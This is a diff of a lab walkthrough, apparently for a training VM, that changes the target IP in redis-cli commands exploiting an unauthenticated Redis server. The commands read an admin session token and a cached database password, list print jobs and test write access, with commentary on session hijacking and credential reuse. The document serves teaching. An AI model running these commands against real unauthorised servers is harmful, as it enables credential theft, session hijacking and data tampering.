@@ -22,7 +22,7 @@ Exploitation of the unauthenticated Redis instance confirmed in `r-16- redis-enu
 **On Kali**, retrieving and interpreting each key:
 
 ```bash
-redis-cli -h 192.168.144.200 get session:admin:token
+redis-cli -h 192.168.144.100 get session:admin:token
 ```
 ```
 "a8f3e2b1c9d04f5e8a7b6c3d2e1f0a9b"
@@ -30,7 +30,7 @@ redis-cli -h 192.168.144.200 get session:admin:token
 **What this is worth:** a session token is the credential a web application uses to recognise an already-logged-in user without asking for a password again. If this token belongs to a real, currently active admin session in some application using this Redis instance as its session store, an attacker can present this exact token to that application and be treated as that logged-in administrator, no password needed at all. This is session hijacking via a stolen session store, one of the most direct and damaging things an exposed Redis instance can hand an attacker, since it can bypass authentication entirely rather than merely disclosing information.
 
 ```bash
-redis-cli -h 192.168.144.200 get app:config:db_password
+redis-cli -h 192.168.144.100 get app:config:db_password
 ```
 ```
 "R3d1s_C4che_2026!"
@@ -38,7 +38,7 @@ redis-cli -h 192.168.144.200 get app:config:db_password
 **What this is worth:** applications very commonly cache their own configuration values, including database credentials, in Redis for fast access rather than re-reading a config file on every request. A value named exactly `db_password` is an extremely strong signal this is a real credential for some other service, most plausibly the MariaDB instance already identified on this VM (`r-08- mysql-mariadb-enumeration.md`). This is a credential-reuse discovery: a student should immediately try this password against MariaDB (and any other authenticated service on the host) as the direct next step, exactly the kind of lateral, cross-service thinking this whole VM has been built to encourage.
 
 ```bash
-redis-cli -h 192.168.144.200 lrange queue:print_jobs 0 -1
+redis-cli -h 192.168.144.100 lrange queue:print_jobs 0 -1
 ```
 ```
 1) "HR-LaserJet-2F:Q3_Budget_Review.pdf"
@@ -48,9 +48,9 @@ redis-cli -h 192.168.144.200 lrange queue:print_jobs 0 -1
 **Demonstrating write access:**
 
 ```bash
-redis-cli -h 192.168.144.200 set attacker:test "unauthenticated write confirmed"
-redis-cli -h 192.168.144.200 get attacker:test
-redis-cli -h 192.168.144.200 del attacker:test
+redis-cli -h 192.168.144.100 set attacker:test "unauthenticated write confirmed"
+redis-cli -h 192.168.144.100 get attacker:test
+redis-cli -h 192.168.144.100 del attacker:test
 ```
 
 A successful write, read-back, and cleanup confirms the exposure is not read-only; an attacker could just as easily corrupt or delete existing application data (including the session token and config values relied upon by whatever real application uses this Redis instance), not merely read it.
